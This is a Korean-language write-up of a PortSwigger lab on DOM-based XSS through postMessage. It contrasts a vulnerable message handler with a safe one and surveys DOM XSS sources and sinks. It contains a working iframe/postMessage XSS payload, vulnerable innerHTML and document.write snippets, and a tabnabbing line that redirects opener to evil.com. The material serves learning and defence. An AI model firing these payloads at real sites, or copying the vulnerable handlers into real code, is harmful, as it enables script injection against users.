# Lab: DOM XSS using web messages

## 개요

- **난이도**: Apprentice
- **주제**: DOM-based XSS — web messages / postMessage / iframe 크로스 오리진 통신
- **링크**: https://portswigger.net/web-security/dom-based/controlling-the-web-message-source/lab-dom-xss-using-web-messages

## 목표

타겟 페이지가 `window.addEventListener('message', ...)` 로 수신한 메시지를 `innerHTML` 에 그대로 삽입하는 취약점을 이용한다. iframe 으로 타겟 페이지를 로드한 뒤 `postMessage` 로 XSS 페이로드를 전송하여 실행시킨다.

## Web Message (postMessage) 란

### 기본 개념

```
window.postMessage() 는 서로 다른 오리진의 윈도우 간 안전한 통신을 위해
설계된 브라우저 API

일반적인 same-origin 정책:
  https://a.com 의 JS → https://b.com 의 DOM 접근 불가 (차단)

postMessage 를 통한 예외:
  https://a.com → postMessage → https://b.com 으로 메시지 전달 가능
  수신 측이 addEventListener('message') 로 처리
```

### postMessage API

```javascript
// 송신 (sender)
targetWindow.postMessage(message, targetOrigin);

// 예시:
iframe.contentWindow.postMessage('hello', 'https://target.com');
iframe.contentWindow.postMessage('hello', '*');  // 모든 오리진으로 전송

// 수신 (receiver)
window.addEventListener('message', function(event) {
    console.log(event.data);     // 수신된 메시지 내용
    console.log(event.origin);   // 발신자 오리진
    console.log(event.source);   // 발신자 윈도우 참조
});
```

### postMessage 파라미터

```
postMessage(message, targetOrigin, [transfer])

message      : 전달할 데이터 (문자열, 객체 등)
targetOrigin : 수신 대상 오리진
               '*'  → 모든 오리진 허용 (보안 취약)
               'https://target.com' → 특정 오리진만 허용 (안전)

event 객체 속성:
  event.data   : 수신된 메시지 데이터
  event.origin : 발신자의 오리진 (검증에 사용)
  event.source : 발신자 윈도우 객체
```

## 취약점 분석

### 취약한 메시지 핸들러

```javascript
// 타겟 사이트의 취약한 코드
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;
    // ↑ 수신 데이터를 origin 검증 없이 innerHTML 에 직접 삽입
    // → XSS 취약점!
});
```

```
취약점 두 가지:
  1. event.origin 검증 없음
     → 어떤 오리진에서 보낸 메시지든 처리
     → 공격자 페이지에서 전송한 메시지도 처리

  2. innerHTML 에 직접 삽입
     → HTML 태그, 이벤트 핸들러 실행됨
     → <img src=1 onerror=print()> → XSS 실행
```

### 안전한 핸들러와 비교

```javascript
// 취약한 핸들러
window.addEventListener('message', function(e) {
    document.getElementById('ads').innerHTML = e.data;  // 위험!
});

// 안전한 핸들러
window.addEventListener('message', function(e) {
    // 1. origin 검증
    if (e.origin !== 'https://trusted-site.com') return;

    // 2. 안전한 삽입 방법
    document.getElementById('ads').textContent = e.data;  // 텍스트만
    // 또는
    document.getElementById('ads').innerHTML =
        DOMPurify.sanitize(e.data);  // sanitization
});
```

## 공격 방법

### 공격 흐름

```
1. 공격자: iframe 으로 타겟 페이지 로드
2. iframe 로드 완료 후: postMessage 로 XSS 페이로드 전송
3. 타겟 페이지의 message 핸들러: 수신 데이터를 innerHTML 에 삽입
4. XSS 실행
```

### 페이로드

```html
<!-- exploit server 에 호스팅 -->
<iframe
  src="https://VULNERABLE.com/"
  onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')"
></iframe>
```

```
동작 순서:
  1. <iframe src="VULNERABLE"> → 타겟 페이지 로드
  2. onload 발화 → iframe 로드 완료 시점
  3. this.contentWindow.postMessage(...)
     → iframe(타겟 페이지)으로 XSS 페이로드 전송
     → '*': 오리진 무관 전송
  4. 타겟 페이지 핸들러:
     innerHTML = '<img src=1 onerror=print()>'
  5. img 로드 실패 → onerror → print() 실행
```

### Same-origin 정책과 postMessage 의 차이

```
[일반 크로스 오리진 접근 — 차단]
  iframe.contentDocument.body.innerHTML = '<script>...'
  → SecurityError: cross-origin access blocked

[postMessage — 허용]
  iframe.contentWindow.postMessage('<img src=1 onerror=print()>', '*')
  → 브라우저가 허용하는 크로스 오리진 통신 채널
  → 수신 측이 처리 방법을 결정
  → 수신 측 코드가 취약하면 XSS 성립
```

## Window의 주요 통신 API 정리

### 1. postMessage

```javascript
// 용도: 크로스 오리진 윈도우 간 메시지 전달
// 사용 위치: iframe, popup, worker 통신

// 송신
window.postMessage(data, targetOrigin);
iframe.contentWindow.postMessage(data, '*');
opener.postMessage(data, '*');  // 팝업의 부모에게

// 수신
window.addEventListener('message', (e) => {
    // e.data, e.origin, e.source
});

// 보안 이슈:
//   - targetOrigin '*' 사용 → 의도치 않은 수신자에게 전달
//   - origin 검증 없는 수신 → 악의적 메시지 처리
```

### 2. location

```javascript
// 용도: 현재 페이지 URL 정보 접근 및 이동

location.href      // 전체 URL
location.origin    // scheme + host + port
location.hostname  // 호스트명만
location.pathname  // 경로 (/path/to/page)
location.search    // 쿼리스트링 (?key=value)
location.hash      // 해시 (#section)

// 페이지 이동
location.href = 'https://example.com';
location.assign('https://example.com');   // 히스토리 기록
location.replace('https://example.com');  // 히스토리 미기록

// DOM XSS 취약점 소스로 자주 사용:
const id = new URLSearchParams(location.search).get('id');
document.getElementById('output').innerHTML = id;  // 취약!

const hash = location.hash.slice(1);
document.write(hash);  // 취약!
```

### 3. window.name

```javascript
// 용도: 윈도우/탭에 이름을 부여, 크로스 오리진에서도 읽기 가능
// 특이점: 페이지 이동 후에도 값이 유지됨

window.name = 'my-window';

// 크로스 오리진 데이터 전달에 남용될 수 있음:
// 공격자: window.name = '<script>alert(1)</script>'
// 피해자 사이트: document.write(window.name) → XSS!
```

### 4. document.referrer

```javascript
// 용도: 이전 페이지 URL (Referer 헤더와 동일)

document.referrer  // "https://previous-page.com/path"

// DOM XSS 소스:
document.getElementById('back').innerHTML =
    'From: ' + document.referrer;  // 취약!
```

### 5. opener

```javascript
// 용도: 현재 창을 열어준 부모 창 참조 (window.open 으로 열린 경우)

// 자식 창에서:
opener.postMessage('ready', '*');
opener.location = 'https://evil.com';  // 탭 내빙 공격!

// 탭내빙(tabnabbing) 방어:
// <a href="..." target="_blank" rel="noopener noreferrer">
// → noopener: 자식 창에서 opener 접근 불가
```

## DOM XSS 소스와 싱크 관계

```
[소스 (Source) — 공격자가 제어 가능한 입력]
  location.search    → URL 쿼리스트링
  location.hash      → URL 해시
  location.href      → 전체 URL
  document.referrer  → Referer 헤더
  window.name        → 윈도우 이름
  postMessage        → 크로스 오리진 메시지 ← 이번 랩
  document.cookie    → 쿠키 값

[싱크 (Sink) — 실행이 일어나는 위치]
  innerHTML / outerHTML     → HTML 파싱 → XSS
  document.write()          → HTML 삽입 → XSS
  eval()                    → JS 실행 → XSS
  setTimeout(string)        → JS 실행 → XSS
  location.href = user_input → javascript: 실행 가능
  src / href 속성           → javascript: 실행 가능

이번 랩:
  소스: postMessage → event.data
  싱크: innerHTML   → XSS 실행
```

## 핵심 정리

- `postMessage` 는 크로스 오리진 통신을 허용하는 API로, 수신 측에서 `event.origin` 을 검증하지 않으면 외부에서 임의 메시지를 주입할 수 있다.
- 수신한 메시지를 `innerHTML` 에 삽입하면 DOM XSS 가 발생한다.
- iframe + onload + postMessage 조합으로 타겟 페이지에 크로스 오리진 XSS 페이로드를 전달할 수 있다.
- **방어**:
  - 수신 핸들러에서 `event.origin` 검증 (허용 목록 방식)
  - `innerHTML` 대신 `textContent` 사용, 또는 DOMPurify sanitization
  - 송신 시 `targetOrigin` 에 `'*'` 대신 정확한 오리진 지정
